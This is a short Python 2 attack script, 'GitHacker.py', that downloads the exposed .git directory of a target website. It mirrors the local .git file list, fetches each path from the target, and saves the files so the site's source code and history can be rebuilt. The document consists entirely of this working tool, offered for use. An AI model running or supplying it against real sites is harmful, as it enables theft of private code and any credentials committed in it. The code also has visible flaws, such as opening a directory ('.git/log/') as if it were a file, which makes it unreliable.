#!/usr/bin/env python
# encoding:utf-8

import os
import requests
import sys

def dirlist(path, allfile):
    filelist =  os.listdir(path)
    for filename in filelist:
        filepath = os.path.join(path, filename)
        if os.path.isdir(filepath):
            dirlist(filepath, allfile)
        else:
            allfile.append(filepath)
    return allfile

def downloadFile(url, path):
    index = path[::-1].find("/")
    folder = path[0:-index]
    try:
        print "[+] Make dir : %s" % (folder)
        os.makedirs(folder)
    except:
        print "[-] Folder already existed!"
    response = requests.get(url)
    if response.status_code == 200:
        with open(path, "wb") as f:
            print response.content
            f.write(response.content)
            print "[+] Success!"
    else:
        print "[-] [%d]" % (response.status_code)

def main():
    if len(sys.argv) != 2:
        print "Usage : "
        print "        python GitHacker.py [Website]"
        exit(1)
    files = dirlist("./", [])
    baseurl = sys.argv[1]
    temppath = baseurl.split("http://")[1].split("/")[0]
    for i in files:
        if i.startswith("./.git"):
            path = "./%s/%s" % (temppath, i[2:])
            url = baseurl + i[2:]
            downloadFile(url, path)
    master = open("./%s/.git/log/" % temppath, "r")
    for line in master:
        print line

if __name__ == "__main__":
    main()
